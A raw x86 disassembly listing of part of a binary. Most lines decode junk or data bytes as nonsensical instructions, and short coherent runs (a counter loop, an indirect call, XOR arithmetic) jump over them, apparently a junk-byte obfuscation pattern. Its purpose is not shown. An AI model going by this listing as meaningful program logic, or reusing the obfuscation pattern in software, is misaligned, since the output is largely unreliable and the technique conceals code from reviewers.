  40190b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40190c:	cmc    
  40190d:	int    0xca
  40190f:	xchg   ecx,eax
  401910:	mov    ecx,0x61685f14
  401915:	lods   al,BYTE PTR ds:[esi]
  401916:	mov    ah,0x7d
  401918:	lods   al,BYTE PTR ds:[esi]
  401919:	xchg   ebp,eax
  40191a:	es lock sbb BYTE PTR gs:[esi+0x21],al
  401920:	and    BYTE PTR ds:0x52473800,bh
  401926:	jle    0x4018d4
  401928:	sub    al,0x6a
  40192a:	call   esi
  40192c:	pop    ds
  40192d:	xorps  xmm7,xmm1
  401930:	mov    ebp,edx
  401932:	push   edi
  401933:	sar    BYTE PTR [eax-0x1],cl
  401936:	cmp    eax,0xaf66f64f
  40193b:	mov    ebx,cs
  40193d:	call   0x25c6:0xe6b88075
  401944:	mov    ecx,0xd57d3a19
  401949:	test   eax,edi
  40194b:	lods   eax,DWORD PTR ds:[esi]
  40194c:	dec    ebp
  40194d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40194e:	retf   
  40194f:	or     BYTE PTR [ecx],bh
  401951:	or     cl,cl
  401953:	and    eax,0xb7210c0f
  401958:	add    BYTE PTR [edx-0x1c0cadf3],0xf1
  40195f:	jbe    0x4019a3
  401961:	sar    cl,1
  401963:	pop    eax
  401964:	xor    esi,DWORD PTR [ecx]
  401966:	cmp    dl,dl
  401968:	add    DWORD PTR [ebx+ecx*2+0x4ba20302],ecx
  40196f:	pop    ss
  401970:	or     eax,0x8e26034
  401975:	test   eax,0x27aa9633
  40197a:	xchg   DWORD PTR [ebx],ecx
  40197c:	or     al,0x49
  40197e:	cmc    
  40197f:	push   es
  401980:	pusha  
  401981:	fdivp  st(1),st
  401983:	sub    ebp,ebx
  401985:	cmp    dl,BYTE PTR [esi-0x58]
  401988:	fsub   DWORD PTR [eax-0x22155aeb]
  40198e:	(bad)  [edx]
  401990:	mov    al,0xf7
  401992:	and    eax,0x9291d83c
  401997:	shr    bh,0x21
  40199a:	xor    DWORD PTR [edi],ebp
  40199c:	inc    ebx
  40199d:	sahf   
  40199e:	add    esi,DWORD PTR [ebp+0x16]
  4019a1:	sahf   
  4019a2:	dec    ebx
  4019a3:	mov    edi,0x719ca32e
  4019a8:	test   eax,0xa86c3540
  4019ad:	jo     0x401a2d
  4019af:	inc    ebp
  4019b0:	loope  0x401967
  4019b2:	or     eax,0x896ebe2e
  4019b7:	aad    0xb9
  4019b9:	mov    bh,0xc3
  4019bb:	xchg   edi,eax
  4019bc:	and    dh,BYTE PTR [edx]
  4019be:	out    dx,eax
  4019bf:	dec    bx
  4019c1:	jbe    0x4019b8
  4019c3:	sub    esp,DWORD PTR [ebx-0x4ee8ad8a]
  4019c9:	lea    ebp,[ecx]
  4019cb:	dec    ebx
  4019cc:	pop    edi
  4019cd:	(bad)  
  4019ce:	cmp    DWORD PTR [esi+0x35],edi
  4019d1:	out    dx,al
  4019d2:	(bad)  
  4019d3:	jbe    0x401a20
  4019d5:	loope  0x40198a
  4019d7:	les    ebx,FWORD PTR [edx]
  4019d9:	mov    DWORD PTR [ecx],ebx
  4019db:	je     0x4019ec
  4019dd:	add    al,0x36
  4019df:	or     bl,BYTE PTR [eax-0x76]
  4019e2:	mov    ch,0xe4
  4019e4:	xor    eax,0x14de7343
  4019e9:	ret    0xda0d
  4019ec:	pop    dx
  4019ee:	sbb    edx,edi
  4019f0:	sbb    al,BYTE PTR [edx-0x2d29836c]
  4019f6:	adc    DWORD PTR [edi],edi
  4019f8:	jmp    0x4019dc
  4019fa:	fild   DWORD PTR [ecx+0x65326008]
  401a00:	and    eax,0x1d4ac632
  401a05:	cmp    eax,0xbfd0fadd
  401a0a:	outs   dx,DWORD PTR ds:[esi]
  401a0b:	test   eax,0xb4c06624
  401a10:	cs (bad) 
  401a12:	rol    esp,1
  401a14:	cmp    DWORD PTR [edx-0x53],0x6bdd6cec
  401a1b:	jb     0x4019a4
  401a1d:	test   eax,0xad5c908a
  401a22:	sub    eax,0x985dca63
  401a27:	(bad)  
  401a28:	ins    DWORD PTR es:[edi],dx
  401a29:	add    bl,bh
  401a2b:	dec    edi
  401a2c:	out    0x28,eax
  401a2e:	(bad)  
  401a30:	or     BYTE PTR [ecx],bl
  401a32:	xchg   ebp,eax
  401a33:	pop    ebp
  401a34:	push   ds
  401a35:	sbb    DWORD PTR [eax],0xa8325d9b
  401a3b:	sub    eax,0x39ed1de1
  401a40:	xor    BYTE PTR [esi-0x57],ch
  401a43:	jecxz  0x401abf
  401a45:	cld    
  401a46:	mov    ds:0xa67b29f0,al
  401a4b:	sub    DWORD PTR [edx+0x25],ebx
  401a4e:	test   BYTE PTR [ebx],bl
  401a50:	rcr    DWORD PTR [ecx+edx*8],0x21
  401a54:	xchg   DWORD PTR ds:0x8ce1b13e,eax
  401a5a:	pop    esp
  401a5b:	xchg   ebp,eax
  401a5c:	stos   BYTE PTR es:[edi],al
  401a5d:	inc    eax
  401a5e:	add    dl,bh
  401a60:	sub    edx,DWORD PTR [ecx]
  401a62:	mov    eax,DWORD PTR [ebp+0x8]
  401a65:	and    DWORD PTR ds:0x4345cf,0x0
  401a6f:	mov    ecx,DWORD PTR ds:0x4345cf
  401a75:	inc    ecx
  401a76:	mov    DWORD PTR ds:0x4345cf,ecx
  401a7c:	cmp    DWORD PTR ds:0x4345cf,0x5
  401a83:	jne    0x401a92
  401a89:	push   DWORD PTR [ebp-0x24]
  401a8c:	call   DWORD PTR ds:0x413274
  401a92:	cmp    DWORD PTR ds:0x4345cf,0x4
  401a99:	jne    0x401aae
  401a9f:	xor    ecx,ecx
  401aa1:	or     ecx,DWORD PTR ds:0x4345cf
  401aa7:	inc    ecx
  401aa8:	mov    DWORD PTR ds:0x4345cf,ecx
  401aae:	cmp    DWORD PTR ds:0x4345cf,0x11
  401ab5:	jb     0x401a6f
  401abb:	mov    ecx,DWORD PTR [ebp-0x10]
  401abe:	xor    eax,esi
  401ac0:	add    eax,edi
  401ac2:	mov    DWORD PTR [ecx],eax
  401ac4:	mov    eax,DWORD PTR [ebp-0x10]
  401ac7:	mov    ecx,DWORD PTR [ebp+0x10]
  401aca:	xor    ecx,esi
  401acc:	mov    edx,0xffcd8d67
  401ad1:	sub    edx,ecx
  401ad3:	add    DWORD PTR [eax],edx
  401ad5:	jmp    0x401ca9
  401ada:	icebp  
  401adb:	jmp    0x401a65
  401add:	imul   ebx,DWORD PTR [ebp+esi*2-0x17498c0f],0x88ca485e
  401ae8:	xor    eax,0x7e045244
  401aed:	jle    0x401aa4
  401aef:	jg     0x401b6f
  401af1:	jle    0x401a7b
  401af3:	sbb    al,0x35
  401af6:	mov    eax,ds:0xd6fd0a75
  401afb:	push   ds
  401afc:	sub    BYTE PTR [eax+edi*8+0x328ae8ad],cl
  401b03:	pop    es
  401b04:	ins    DWORD PTR es:[edi],dx
  401b05:	aam    0x2e
  401b07:	repz retf 
  401b09:	push   ds
  401b0a:	push   esp
  401b0b:	fwait
  401b0c:	pop    ebx
  401b0d:	fcmovnb st,st(1)
  401b0f:	xchg   edx,eax
  401b10:	outs   dx,DWORD PTR ds:[esi]
  401b11:	ss add bh,ch
  401b14:	and    bh,bl
  401b16:	sahf   
  401b17:	xor    ebp,DWORD PTR [edx]
  401b19:	ss mov al,al
  401b1c:	test   BYTE PTR [ecx+0x3379ea00],bl
  401b22:	inc    eax
  401b24:	mov    ss,WORD PTR [eax-0x63]
  401b27:	or     esp,DWORD PTR fs:[ebx]
  401b2a:	mov    bh,0xfe
  401b2c:	push   esi
  401b2d:	push   0xe6f01c3f
  401b32:	fisub  WORD PTR [eax+0x73]
  401b35:	stos   BYTE PTR es:[edi],al
  401b36:	lods   al,BYTE PTR cs:[esi]
  401b38:	xor    BYTE PTR [ebx+ebx*1],dh
  401b3b:	mov    ds:0x587d0e5a,eax
  401b40:	adc    al,BYTE PTR [ecx+0x4b]
  401b43:	outs   dx,BYTE PTR ds:[esi]
  401b44:	popa   
  401b45:	test   al,0x97
  401b47:	sbb    BYTE PTR gs:[edi+edx*1-0x5],ch
  401b4c:	outs   dx,DWORD PTR ds:[esi]
  401b4d:	mov    dl,BYTE PTR [ebp+0x1d]
  401b50:	call   0x3eec:0x8bb8b37a
  401b57:	inc    eax
  401b58:	jne    0x401b09
  401b5a:	jo     0x401bac
  401b5c:	pop    ebx
  401b5d:	test   DWORD PTR [ebx],0x21c14dde
  401b63:	sub    BYTE PTR [esi+edx*8+0x17fdaf33],bl
  401b6a:	push   eax
  401b6b:	pop    esi
  401b6c:	jmp    0x9b2a0705
  401b71:	pop    es
  401b72:	cmp    DWORD PTR [eax],0xffffffb2
  401b75:	mov    ah,0x5a
  401b77:	jne    0x401be4
  401b79:	int3   
  401b7a:	(bad)  
  401b7b:	fisubr WORD PTR [ebx]
  401b7d:	sub    ch,cl
  401b7f:	ins    DWORD PTR es:[edi],dx
  401b80:	or     edx,edi
  401b82:	jecxz  0x401b3f
  401b84:	fwait
  401b85:	aam    0xf1
  401b87:	xor    al,0x2f
  401b89:	xor    ebp,DWORD PTR [esi+0x14512a88]
  401b8f:	rcr    BYTE PTR [esp+eiz*2-0x4c],0x15
  401b94:	adc    bh,bl
  401b96:	xchg   BYTE PTR [ecx-0x42b192a9],bl
  401b9c:	nop
  401b9d:	outs   dx,DWORD PTR ds:[esi]
  401b9e:	fsubp  st(7),st
  401ba0:	dec    esi
  401ba1:	push   eax
  401ba2:	ret    0x515e
  401ba5:	and    eax,0xbeaa1d81
  401baa:	dec    edi
  401bab:	(bad)  
  401bac:	sbb    bh,dh
  401bae:	(bad)  
  401baf:	and    DWORD PTR [eax+0xf],eax
  401bb2:	dec    ebp
  401bb3:	fild   QWORD PTR [edi+0x6345f408]
  401bb9:	bsr    esi,DWORD PTR [esi+0x78]
  401bbd:	mov    ds,eax
  401bbf:	into   
  401bc0:	push   0xffffff89
  401bc2:	jno    0x401b5d
  401bc4:	mov    ch,0xe6
  401bc6:	mov    al,ds:0x48e1c0c3
  401bcb:	sbb    al,0x21
  401bcd:	sub    eax,0xe657b525
  401bd2:	mov    esi,0xd389ecc5
  401bd7:	add    BYTE PTR [esi-0x7c],bh
  401bda:	push   esi
  401bdb:	or     eax,DWORD PTR [ecx]
  401bdd:	dec    edi
  401bde:	retf   0x326e
  401be1:	xchg   ecx,eax
  401be2:	out    dx,eax
  401be3:	fcom   DWORD PTR [ebx]
  401be5:	jp     0x401bcd
  401be7:	mov    esi,esp
  401be9:	adc    al,0x81
  401beb:	clc    
  401bec:	xor    DWORD PTR [eax+eiz*8-0x582ac124],0xffffff8a
  401bf4:	dec    edi
  401bf5:	add    bh,BYTE PTR [edi]
  401bf7:	xor    cl,cl
  401bf9:	call   0x63ae:0xac193a8f
  401c00:	xor    esp,eax
  401c02:	cmp    DWORD PTR [edi+0xac65ce9],esp
  401c08:	pop    ecx
  401c09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401c0a:	outs   dx,DWORD PTR ds:[esi]
  401c0b:	lods   eax,DWORD PTR ds:[esi]
  401c0c:	inc    esi
  401c0d:	dec    edi
  401c0e:	inc    esp
  401c0f:	inc    edx
  401c10:	push   cs
  401c11:	cmc    
  401c12:	inc    esp
  401c13:	mov    ebx,0x330625bd
  401c18:	push   edi
  401c19:	stos   BYTE PTR es:[edi],al
  401c1a:	adc    esi,DWORD PTR [ebp+0x2935f3bb]
  401c20:	sbb    DWORD PTR [ecx+eiz*2-0x2e],0xe3c240f3
  401c28:	mov    ecx,0x3647b897
  401c2d:	dec    eax
  401c2e:	mov    al,0xcc
  401c30:	mov    dl,0x66
  401c32:	inc    ebp
  401c33:	jle    0x401bb7
  401c35:	xor    edi,DWORD PTR [ebp-0x35]
  401c38:	fxch   st(6)
  401c3a:	in     al,0x90
  401c3c:	add    al,0xb1
  401c3e:	in     eax,0xd5
  401c40:	mov    es,WORD PTR [ecx]
  401c42:	ins    DWORD PTR es:[edi],dx
  401c43:	xor    dl,al
  401c45:	stc    
  401c46:	mov    ebp,0x44ac9bf0
  401c4b:	repnz adc DWORD PTR [edx+esi*1],esi
  401c4f:	pop    ecx
  401c50:	mov    edi,0xfa48e54c
  401c55:	jle    0x401c83
  401c57:	xchg   edi,eax
  401c58:	mov    al,ds:0x67348a81
  401c5d:	or     al,0x3c
  401c5f:	adc    BYTE PTR [esi-0x37],bl
  401c62:	retf   0x9143
  401c65:	xchg   edx,eax
  401c66:	cwde   
  401c67:	repnz adc ah,ah
  401c6a:	dec    eax
  401c6b:	je     0x401c2e
  401c6d:	dec    ecx
  401c6e:	adc    ebp,DWORD PTR [edx]
  401c70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401c71:	out    dx,eax
  401c72:	(bad)  
  401c73:	xlat   BYTE PTR ds:[ebx]
  401c74:	repz push 0xffffffd6
  401c77:	aam    0x2f
  401c79:	mov    ds:0xd6fb65b,eax
  401c7e:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401c80:	jmp    0xa94d755b
  401c85:	inc    eax
  401c86:	sar    BYTE PTR [edx],0xd3
  401c89:	cmc    
  401c8a:	mov    esi,0x485e40c8
  401c8f:	repz loop 0x401c45
  401c92:	shl    ah,1
  401c94:	fisubr WORD PTR [eax-0x6e]
  401c97:	cli    
  401c98:	retf   0x6856
  401c9b:	popa   
  401c9c:	and    BYTE PTR [edx-0x71],0x3f
  401ca0:	dec    eax
  401ca1:	cwde   
  401ca2:	inc    eax
  401ca3:	mov    BYTE PTR [ecx+0x3b2a78d3],dh
  401ca9:	mov    eax,ds:0x414bd2
  401cae:	mov    eax,DWORD PTR [eax]
  401cb0:	mov    cx,WORD PTR [ebp-0x4]
  401cb4:	movzx  ecx,cx
  401cb7:	add    ecx,DWORD PTR [eax]
  401cb9:	jmp    0x401e8d
  401cbe:	push   edi
  401cbf:	mov    DWORD PTR ds:0x7d73cde7,eax
  401cc5:	test   eax,0x7c3826d3
  401cca:	mov    edi,0x898a48a0
  401ccf:	push   es
  401cd0:	jle    0x401d50
  401cd2:	mov    ch,0x7f
  401cd4:	jle    0x401d54
  401cd6:	or     dh,ch
  401cd8:	call   0xe09b:0x40d216d4
  401cdf:	inc    ecx
  401ce0:	xchg   edx,eax
  401ce1:	popf   
  401ce2:	xchg   ebx,eax
  401ce3:	and    eax,0x12d7e7e9
  401ce8:	mov    dl,0xee
  401cea:	rcl    BYTE PTR [eax+0x1937f6b0],1
  401cf0:	add    bh,BYTE PTR [ecx+0x2cb2a53c]
  401cf6:	xchg   esi,eax
  401cf7:	dec    edx
  401cf8:	add    eax,edx
  401cfa:	stos   DWORD PTR es:[edi],eax
  401cfb:	push   eax
  401cfc:	arpl   sp,cx
  401cfe:	fstp   QWORD PTR [ebx]
  401d00:	jmp    0x8b14:0x441badca
  401d07:	pop    ss
  401d08:	ins    DWORD PTR es:[edi],dx
  401d09:	rcr    DWORD PTR [esi],1
  401d0b:	jnp    0x401cde
  401d0d:	xor    edi,DWORD PTR [ebx]
  401d0f:	dec    esi
  401d10:	loopne 0x401ca0
  401d12:	add    DWORD PTR [edi],ebp
  401d14:	out    0x1b,al
  401d16:	loopne 0x401d84
  401d18:	jmp    0xfc06:0xc31781d
  401d1f:	pop    ebp
  401d20:	fldcw  WORD PTR [esi+0x38]
  401d23:	and    DWORD PTR [ecx-0x1ea164da],esp
  401d29:	ds mov esi,0xde6a7bf7
  401d2f:	ss jbe 0x401cf5
  401d32:	inc    ebx
  401d33:	std    
  401d34:	and    al,0x6b
  401d36:	test   BYTE PTR [edi-0x25],0x3b
  401d3a:	or     DWORD PTR [eax-0x5e],ecx
  401d3d:	mov    dh,0x7f
  401d3f:	in     al,0x5
  401d41:	mov    bh,0x7c
  401d43:	pop    ebx
  401d44:	ret    
  401d45:	and    BYTE PTR [ebx+0x37],ch
  401d48:	jns    0x401d6e
  401d4a:	pop    ebp
  401d4b:	daa    
  401d4c:	sub    DWORD PTR [ecx+esi*8-0x4e29f64c],eax
  401d53:	mov    ecx,0xf2671c16
  401d58:	push   esi
  401d59:	xchg   esi,eax
  401d5a:	add    BYTE PTR [edi],ch
  401d5c:	push   esp
  401d5d:	test   al,0xce
  401d5f:	pusha  
  401d60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401d61:	jnp    0x401d38
  401d63:	pop    ds
  401d64:	daa    
  401d65:	idiv   esp
  401d67:	out    dx,eax
  401d68:	push   esi
  401d69:	or     eax,0xa7697e44
  401d6e:	sbb    BYTE PTR [esi+ebx*8-0x54eafbd9],0xb5
  401d76:	mov    fs,WORD PTR [edi]
  401d78:	pop    ebx
  401d79:	call   0x2a67:0x22de4d92
  401d80:	jo     0x401dd3
  401d82:	mov    eax,0x429606db
  401d87:	push   edi
  401d88:	cmc    
  401d89:	fisttp QWORD PTR [edi-0x3b]
  401d8c:	mov    bh,0x2e
  401d8e:	into   
  401d8f:	test   DWORD PTR [ecx+0x4a],esp
  401d92:	and    DWORD PTR [ecx],ebp
  401d94:	ret    0xdd70
  401d97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401d98:	push   cs
  401d99:	xor    DWORD PTR es:[eax],eax
  401d9c:	sbb    edi,DWORD PTR [eax-0x2cbe374e]
  401da2:	xchg   esi,eax
  401da3:	cmc    
  401da4:	ret    0xa893
  401da7:	addr16 jmp 0xb3f13e8
  401dad:	arpl   WORD PTR [ecx],bp
  401daf:	in     al,dx
  401db0:	cmc    
  401db1:	arpl   bx,di
  401db3:	dec    edi
  401db4:	lods   al,BYTE PTR ds:[esi]
  401db5:	add    al,0x7e
  401db7:	mov    ebx,0x95a4ae57
  401dbc:	scas   al,BYTE PTR es:[edi]
  401dbd:	fdiv   DWORD PTR [edx]
  401dbf:	add    ebx,edx
  401dc1:	cmc    
  401dc2:	or     DWORD PTR [ecx-0x2f6d1a80],edi
  401dc8:	shl    BYTE PTR [edx+0xd2928bc],0x3
  401dcf:	adc    ecx,DWORD PTR [edi]
  401dd1:	xchg   dh,ah
  401dd3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401dd4:	lahf   
  401dd5:	xchg   edx,eax
  401dd6:	in     al,dx
  401dd7:	(bad)  
  401dd8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401dd9:	aam    0xee
  401ddb:	es push ecx
  401ddd:	scas   eax,DWORD PTR es:[edi]
  401dde:	(bad)  
  401ddf:	and    dl,BYTE PTR [ebp-0x4656997d]
  401de5:	inc    esp
  401de6:	jbe    0x401d81
  401de8:	into   
  401de9:	fisttp DWORD PTR [ecx+edx*2+0x4a]
  401ded:	mov    edi,0xbe0695fd
  401df2:	mov    BYTE PTR [edx-0x30f5ac93],bl
  401df8:	inc    ebx
  401df9:	cld    
  401dfa:	mov    ebp,0xde1dbe93
  401dff:	adc    al,0xfa
  401e01:	mov    ds:0xc8a349f9,eax
  401e06:	icebp  
  401e07:	add    cl,al
  401e09:	push   ss
  401e0a:	out    0xe9,eax
  401e0c:	cmp    eax,ecx
  401e0e:	cmp    eax,DWORD PTR [ecx+0x11cc437e]
  401e14:	ror    eax,cl
  401e16:	add    al,0xe2
  401e18:	or     al,BYTE PTR [edx-0x7e]
  401e1b:	xchg   BYTE PTR [ebx+0x35249a06],dl
  401e21:	div    DWORD PTR [edi]
  401e23:	sbb    cl,BYTE PTR ds:0x9f6fd607
  401e29:	dec    esp
  401e2a:	in     al,0xd
  401e2c:	fisttp QWORD PTR [edx]
  401e2e:	lods   al,BYTE PTR ds:[esi]
  401e2f:	mov    edx,0xf2cd3328
  401e34:	call   0x5642:0x484d00f7
  401e3b:	(bad)  
  401e3c:	jmp    0x401dfb
  401e3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401e3f:	inc    esi
  401e40:	fadd   DWORD PTR [ebp+0x42]
  401e43:	enter  0xfdf,0xc0
  401e47:	cdq    
  401e48:	add    esi,DWORD PTR [edx]
  401e4a:	aas    
  401e4b:	repnz inc esp
  401e4d:	and    esp,DWORD PTR [bp+si]
  401e50:	jo     0x401dd2
  401e52:	push   eax
  401e53:	sbb    eax,0xa361ac54
  401e58:	int    0xc7
  401e5a:	xchg   ebp,eax
  401e5b:	rol    DWORD PTR [ecx],cl
  401e5d:	mov    edi,0xe514441d
  401e62:	lods   al,BYTE PTR ds:[esi]
  401e63:	xlat   BYTE PTR ds:[ebx]
  401e64:	cmp    eax,DWORD PTR [edi+0x6fa21f80]
  401e6a:	sub    bl,BYTE PTR [ebp+0x3d9fb59a]
  401e70:	fwait
  401e71:	and    al,0xb4
  401e73:	inc    edx
  401e74:	push   edx
  401e75:	pop    es
  401e76:	push   ecx
  401e77:	out    dx,al
  401e78:	in     al,dx
  401e79:	outs   dx,BYTE PTR ds:[esi]
  401e7a:	leave  
  401e7b:	jno    0x401e64
  401e7d:	pop    ecx
  401e7e:	sub    BYTE PTR [ecx-0x3c44df6],bl
  401e84:	jae    0x401ea2
  401e86:	xchg   DWORD PTR [edi+0x4270fc54],ebp
  401e8c:	stc    
  401e8d:	mov    DWORD PTR [ebp-0x18],ecx
  401e90:	mov    eax,DWORD PTR [ebp+0xc]
  401e93:	mov    ecx,DWORD PTR [ebp+0xc]
  401e96:	xor    eax,esi
  401e98:	add    eax,eax
  401e9a:	xor    ecx,esi
  401e9c:	sub    ecx,eax
  401e9e:	jmp    0x402072
  401ea3:	xchg   ecx,eax
  401ea4:	sahf   
  401ea5:	loopne 0x401e95
  401ea7:	icebp  
  401ea8:	jo     0x401e3b
  401eaa:	popa   
  401eab:	mov    eax,ds
  401ead:	cmp    DWORD PTR [edi],esi
  401eaf:	cmp    DWORD PTR [ebp-0x5c],0x7e00c099
  401eb6:	jle    0x401e6d
  401eb8:	jg     0x401f38
  401eba:	jle    0x401efd
  401ebc:	retf   0xad67
  401ebf:	jae    0x401f32
  401ec1:	bound  esp,QWORD PTR [esi]
  401ec3:	imul   DWORD PTR [ecx+edi*4]
  401ec6:	mov    dl,0x3f
  401ec8:	mov    al,0xca
  401eca:	jge    0x401f41
  401ecc:	out    0xe7,al
  401ece:	in     al,0x62
  401ed0:	push   0xffffff84
  401ed2:	dec    ecx
  401ed3:	or     eax,0xf8a485da
  401ed8:	sub    cl,0xb1
  401edb:	adc    al,0xdb
  401edd:	iret   
  401ede:	(bad)  
  401edf:	stc    
  401ee0:	aad    0xfb
  401ee2:	add    al,0xc2
  401ee4:	jne    0x401e84
  401ee6:	hlt    
  401ee7:	fbstp  TBYTE PTR ss:[ebx]
  401eea:	in     eax,0x37
  401eec:	retf   0x3845
  401eef:	enter  0x9ef8,0x7
  401ef3:	fwait
  401ef4:	dec    esp
  401ef5:	aad    0x2
  401ef7:	mov    edi,0xb7f7987e
  401efc:	pop    ecx
  401efd:	cmp    eax,0xd5625d80
  401f02:	stc    
  401f03:	lahf   
  401f04:	mov    BYTE PTR [ecx],bh
  401f06:	sub    eax,0x453915a4
  401f0b:	mov    al,0xb5
  401f0d:	out    dx,al
  401f0e:	test   DWORD PTR [ebp+eax*2-0x1d],esp
  401f12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401f13:	clc    
  401f14:	dec    edx
  401f15:	sub    ebx,DWORD PTR [ebp*1-0x7b486e34]
  401f1c:	dec    ebx
  401f1d:	into   
  401f1e:	stos   DWORD PTR es:[edi],eax
  401f1f:	ret    0x61a1
  401f22:	add    edx,DWORD PTR [esi-0x2eff0c53]
  401f28:	pop    ebx
  401f29:	in     al,dx
  401f2a:	dec    ebx
  401f2b:	xor    BYTE PTR [ebp+0x0],ch
  401f2e:	call   FWORD PTR [edi]
  401f30:	xor    cl,BYTE PTR [ecx+0x37]
  401f33:	in     al,0x70
  401f35:	cmp    DWORD PTR [edx-0x72],esp
  401f38:	mov    DWORD PTR [esi-0x540d244d],eax
  401f3e:	adc    al,0x38
  401f40:	and    ecx,0xf36b5cd
  401f46:	ror    BYTE PTR [edi],cl
  401f48:	stc    
  401f49:	jmp    0x48b1:0x4b768df0
  401f50:	aam    0xb8
  401f52:	ja     0x401fba
  401f54:	and    BYTE PTR [ecx],0x9
  401f57:	pop    es
  401f58:	mov    esp,0x2d07688c
  401f5d:	dec    edx
  401f5e:	aas    
  401f5f:	leave  
  401f60:	bnd jae 0x401efd
  401f63:	xchg   edx,eax
  401f64:	pop    ss
  401f65:	lea    ebp,[edi+0x14]
  401f68:	xchg   ebp,eax
  401f69:	out    dx,eax
  401f6a:	pop    edx
  401f6b:	dec    edx
  401f6c:	mov    esi,0xddc5674d
  401f71:	mov    WORD PTR [esi],es
  401f73:	jo     0x401fef
  401f75:	(bad)  
  401f76:	int3   
  401f77:	inc    esp
  401f78:	fisttp WORD PTR [edx-0x6b]
  401f7b:	xchg   esp,eax
  401f7c:	pop    ss
  401f7d:	(bad)  
  401f7e:	shl    esi,1
  401f80:	sbb    DWORD PTR ds:0xe245391f,0xa4dd23af
  401f8a:	push   edi
  401f8b:	inc    edi
  401f8c:	adc    BYTE PTR [eax+0x7a],al
  401f8f:	or     BYTE PTR [ebp+ecx*1+0x4d],0x55
  401f94:	jecxz  0x401fad
  401f96:	cmp    ch,bl
  401f98:	mov    ah,0xb2
  401f9a:	in     al,0x6e
  401f9c:	inc    ecx
  401f9d:	xlat   BYTE PTR ds:[ebx]
  401f9e:	jnp    0x401fa2
  401fa0:	and    cl,BYTE PTR [esi-0x48]
  401fa3:	jmp    0x68da:0xaeedccaa
  401faa:	test   BYTE PTR [eax+0x4e],bh
  401fad:	int3   
  401fae:	leave  
  401faf:	push   edx
  401fb0:	cmc    
  401fb1:	xchg   ebx,eax
  401fb2:	adc    ecx,DWORD PTR [edi+0x2c]
  401fb5:	aad    0x64
  401fb7:	in     al,0xbd
  401fb9:	pop    edx
  401fba:	bound  ecx,QWORD PTR [edx]
  401fbc:	pop    edi
  401fbd:	xchg   esp,eax
  401fbe:	cmp    eax,0x9cdc3a22
  401fc3:	mov    dl,dl
  401fc5:	cmp    edi,DWORD PTR [edx-0x4e3d12a3]
  401fcb:	scas   eax,DWORD PTR es:[edi]
  401fcc:	mov    ah,0xab
  401fce:	push   0xfffffff6
  401fd0:	dec    edx
  401fd1:	inc    eax
  401fd2:	mov    eax,ds:0x939f0f42
  401fd7:	push   ecx
  401fd8:	mov    bl,0xe0
  401fda:	cmp    eax,edi
  401fdc:	inc    edx
  401fdd:	push   cs
  401fde:	dec    edx
  401fdf:	and    esp,DWORD PTR [esi]
  401fe1:	mov    dl,0x20
  401fe3:	fcom   st(5)
  401fe5:	mov    esp,0xf039161d
  401fea:	pop    ebx
  401feb:	pop    eax
  401fec:	jno    0x402006
  401fee:	pop    edx
  401fef:	test   al,ch
  401ff1:	add    ah,BYTE PTR [edi+0x7205bd92]
  401ff7:	and    BYTE PTR ds:0xf7bc9663,cl
  401ffd:	jae    0x401fc9
  401fff:	add    BYTE PTR [ecx+0x13a0ca16],0x23
  402006:	mov    bh,0x68
  402008:	push   es
  402009:	call   0x8ec82584
  40200e:	rcl    DWORD PTR [edx+0x49fd3055],0xe6
  402015:	pop    esp
  402016:	mov    dl,0x36
  402018:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402019:	neg    DWORD PTR [eax+0x177dbe24]
  40201f:	cmp    edx,DWORD PTR [ecx]
  402021:	mov    ah,0x4c
  402023:	(bad)  
  402024:	cmc    
  402025:	cmp    DWORD PTR [edx],ebx
  402027:	jae    0x401fd8
  402029:	jae    0x40201f
  40202b:	mov    edi,0xd6522d2c
  402030:	das    
  402031:	aam    0x22
  402033:	pushf  
  402034:	pop    edx
  402035:	adc    eax,0x674ac905
  40203a:	xor    bl,BYTE PTR [ebp+0x5c5dd3ab]
  402040:	mov    esi,0x34af5f8f
  402045:	adc    BYTE PTR [edx+eiz*2-0x5d],bl
  402049:	sub    eax,0x3074ef06
  40204e:	in     eax,dx
  40204f:	aam    0x44
  402051:	dec    eax
  402052:	out    dx,eax
  402053:	pop    es
  402054:	mov    ebx,0x5a4133d3
  402059:	xor    cl,al
  40205b:	rcr    bh,1
  40205d:	dec    ebx
  40205e:	popf   
  40205f:	pop    ss
  402060:	cmc    
  402061:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402062:	xor    BYTE PTR [ebx],dl
  402064:	xchg   DWORD PTR ds:0x60bc6a42,eax
  40206a:	mov    ecx,0x455d97c1
  40206f:	daa    
  402070:	inc    eax
  402071:	je     0x4020d9
  402073:	mov    eax,DWORD PTR [ebp-0x4]
  402076:	movzx  eax,ax
  402079:	sub    ecx,edi
  40207b:	cmp    eax,ecx
  40207d:	mov    eax,DWORD PTR [ebp+0x10]
  402080:	movzx  ecx,WORD PTR [ebp-0x4]
  402084:	jg     0x40226d
  40208a:	xor    eax,esi
  40208c:	sub    ecx,eax
  40208e:	sub    ecx,edi
  402090:	jmp    0x402264
  402095:	pop    es
  402096:	sbb    DWORD PTR [ecx+ebx*2],esi
  402099:	cmp    al,0x75
  40209b:	push   ebx
  40209c:	popa   
  40209d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40209e:	ins    DWORD PTR es:[edi],dx
  40209f:	std    
  4020a0:	and    DWORD PTR [ebx],ecx
  4020a2:	cdq    
  4020a3:	pop    edx
  4020a4:	jecxz  0x402125
  4020a6:	add    bh,BYTE PTR [esi+0x7e]
  4020a9:	mov    ch,0x7f
  4020ab:	jle    0x40212b
  4020ad:	repz test DWORD PTR [esi+0x34],0x80cbadc0
  4020b5:	mov    ?,WORD PTR [edi+0x2e]
  4020b8:	(bad)  
  4020b9:	(bad)  
  4020ba:	adc    al,0x29
  4020bc:	cld    
  4020bd:	int    0x25
  4020bf:	push   edx
  4020c0:	mov    eax,0x2b69184
